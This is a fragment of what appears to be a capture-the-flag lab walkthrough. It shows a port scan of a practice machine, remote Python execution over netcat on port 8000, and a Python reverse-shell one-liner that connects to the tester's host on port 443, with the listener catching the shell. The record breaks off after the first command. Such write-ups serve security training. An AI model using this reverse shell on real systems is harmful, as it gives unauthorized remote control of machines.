...
```bash
┌──(root㉿kali)-[/home/tzadok/Downloads/pyrat]
└─# nmap -A -p- -T4 10.48.135.54                                                                                                                                                                                                           
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 08:32 IST
Nmap scan report for 10.48.135.54
Host is up (0.021s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2e:a4:ee:43:40:cb:19:78:72:31:69:8e:e0:da:49:f5 (RSA)
|   256 19:95:0e:9b:ab:9b:6f:99:ce:89:40:f6:0a:44:88:b8 (ECDSA)
|_  256 89:8b:d4:b1:95:f2:21:d6:88:5a:9e:6a:e0:57:dd:35 (ED25519)
...
Trying with the basic connection and checking the python works 

```bash
┌──(root㉿kali)-[/home/tzadok/Downloads/pyrat]
└─# nc 10.48.135.54 8000                                                                                                                                                                                                                    
print(8*8)
64
```
...
getting connection with the python code

```bash
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.172.23",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")

```

got the connection as the shell 

```bash
┌──(tzadok㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.172.23] from (UNKNOWN) [10.48.135.54] 52540                                                                                                                                                                             
$ id                                                                                                                                                                                                                                        
id                                                                                                                                                                                                                                          
